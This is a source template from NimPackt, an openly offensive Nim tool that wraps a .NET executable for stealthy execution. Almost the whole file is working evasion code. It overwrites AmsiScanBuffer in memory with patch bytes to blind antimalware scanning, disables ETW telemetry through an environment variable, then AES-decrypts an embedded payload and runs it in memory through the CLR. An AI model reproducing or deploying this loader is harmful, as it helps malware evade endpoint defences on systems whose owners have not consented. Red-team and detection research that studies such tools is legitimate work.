#[
    NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
    By Cas van Cooten (@chvancooten)

    This is a template file. For usage please refer to README.md

    ===
    
    References:

        Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim


        Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
        https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
]#

import nimcrypto
import winim/clr except `[]`
import strformat
import os
import dynlib
import strenc

# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
#[ PLACEHOLDERCRYPTKEY ]#

# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let verbose = false
#[ PLACEHOLDERVERBOSE ]#

# Define a distinct string type for the payload (which will not be XOR'd)
type noCryptString = string

# Get the AMSI patch bytes based on arch
when defined amd64:
    if verbose:
        echo "[*] Running in x64 process"
    const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    if verbose:
        echo "[*] Running in x86 process"
    const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

# Patch AMSI
proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    amsi = loadLib("amsi")
    if isNil(amsi):
        if verbose:
            echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer")
    if isNil(cs):
        if verbose:
            echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
        if verbose:
            echo "[*] Applying amsiPatch"
        copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
        VirtualProtect(cs, amsiPatch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let optionPatchAmsi = true
    #[ PLACEHOLDERPATCHAMSI ]#
    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let optionDisableEtw = true
    #[ PLACEHOLDERDISABLEETW ]#

    var success : bool

    if optionPatchAmsi:
        # Patch AMSI
        success = PatchAmsi()
        if verbose:
            echo fmt"[*] AMSI disabled: {bool(success)}"

    if optionDisableEtw:
        # Disable ETW
        var cometw = "COMPlus_ETWEnabled"
        var setnull = "0"
        putenv(cometw,setnull)
        if getEnv(cometw) == setnull:
            success = true
        else:
            success = false
        if verbose:
            echo fmt"[*] ETW disabled: {bool(success)}"

    #[
        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
        let 
            cryptedInput: array[11, byte] = [byte 0x50,0x9d,0xaa,0xd5,0xdb,0xfc,0xc1,0x53,0xac,0xe2,0x27]
            cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]

        (key is defined separately as a const to prevent the values from being too close together)
    ]#
    #[ PLACEHOLDERCRYPTEDINPUT ]#
    #[ PLACEHOLDERCRYPTIV ]#

    # Decrypt the encrypted bytes
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))

    var
        dctx: CTR[aes128]
        key : array[aes128.sizeKey, byte]
        iv : array[aes128.sizeBlock, byte]
        enctext = newSeq[byte](len(cryptedInput))
        dectext = newSeq[byte](len(cryptedInput))

    key = cryptKey
    iv = cryptIV

    copyMem(unsafeAddr enctext[0], unsafeAddr cryptedInput[0], len(cryptedInput))

    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()

    var assembly = load(dectext)

    # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let arr = toCLRVariant(["argument1", "argument2"], VT_BSTR)
    #[ PLACEHOLDERARGUMENTS ]#

    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))